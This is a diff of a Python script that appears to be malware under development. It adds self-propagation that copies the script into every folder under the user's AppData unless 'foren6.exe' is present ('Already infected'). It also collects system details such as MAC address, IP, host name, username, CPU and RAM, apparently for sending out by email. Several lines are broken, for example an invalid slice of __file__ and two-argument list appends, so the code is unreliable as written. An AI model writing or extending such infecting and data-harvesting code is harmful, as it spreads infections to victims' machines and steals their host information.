@@ -15,7 +15,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import glob
 from shutil import copyfile
-import getpass
+
 
 
 
@@ -152,15 +152,18 @@ def send_info1(time_wait, data):
 
 def copy_files(time):
 	time.sleep(time)
-	username = getpass.getuser()
-	a = glob(f"C:\\Users\\{username}\\Documents\\*\\")
+	username = psutil.users()[0][0]
+	a = glob(f"C:\\Users\\{username}\\AppData\\*\\")
 	for b in a:
 		for file in glob(f"{b}\\*"):
 			print(file)
-        	if file == f"{b}foren6.exe":
+			if file == f"{b}foren6.exe":
 				print("Already infected")
+			else:
+				copyfile(__file__[0,-9], b)
 
-    	print(".")
+
+    	
 	
 
 
@@ -177,7 +180,7 @@ def system_info():
 	mac_address = "MAC ADDRESS: "+':'.join(re.findall('..', '%012x' % uuid.getnode()))
 	local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
 	host_name = "host name: "+socket.gethostname()
-	username = getpass.getuser()
+	username = psutil.users()[0][0]
 	system_info_list.append("USER |",username)
 	system_info_list.append("PROCESSOR |",processor)
 	system_info_list.append("RAM |",ram)
